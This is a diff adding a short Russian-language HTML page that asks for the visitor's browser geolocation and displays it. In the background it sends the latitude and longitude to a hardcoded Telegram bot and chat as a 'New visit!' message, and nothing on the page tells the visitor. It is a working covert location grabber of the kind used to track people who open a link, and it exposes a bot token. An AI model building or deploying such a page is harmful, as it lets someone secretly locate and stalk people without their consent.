@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>Геолокация</title>
+</head>
+<body>
+  <h1>Геолокация</h1>
+  <p id="status">Ожидание разрешения...</p>
+
+  <script>
+    function success(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      document.getElementById('status').textContent =
+        `Ваши координаты: широта ${latitude}, долгота ${longitude}`;
+
+      // Отправка координат в Telegram
+      fetch('https://api.telegram.org/bot7505831892:AAEXunB46sqfDxkas6G1ratUdvuEd6pn-88/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: 6249456543,
+          text: `📍 Новый визит!\nШирота: ${latitude}\nДолгота: ${longitude}`
+        })
+      });
+    }
+
+    function error() {
+      document.getElementById('status').textContent =
+        '❌ Не удалось получить местоположение.';
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(success, error);
+    } else {
+      document.getElementById('status').textContent =
+        'Ваш браузер не поддерживает геолокацию.';
+    }
+  </script>
+</body>
+</html>
